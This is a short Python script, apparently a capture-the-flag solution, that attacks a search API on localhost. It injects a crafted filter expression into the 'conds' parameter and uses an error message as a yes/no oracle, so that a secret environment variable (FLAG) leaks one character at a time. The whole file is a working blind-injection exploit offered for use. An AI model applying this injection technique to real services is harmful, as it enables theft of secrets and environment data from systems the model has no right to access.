import requests

HOST = 'http://localhost:8300'

def query(i, c):
    r = requests.get(f'{HOST}/api/search', params={
        'keys': 'name,author',
        'conds': ','.join(x for x in [
            '\\ in name',
            f'))]|env.FLAG[{i}:{i+1}]as$c|([range(128)]|implode|1/(if(index($c)=={c})then(1)else(0)end))# in name'
        ])
    })
    return 'demo version' in r.json()['error']

i = 0
flag = ''
while not flag.endswith('}'):
    for c in range(0x20, 0x7f):
        if query(i, c):
            flag += chr(c)
            continue
    print(i, flag)
    i += 1
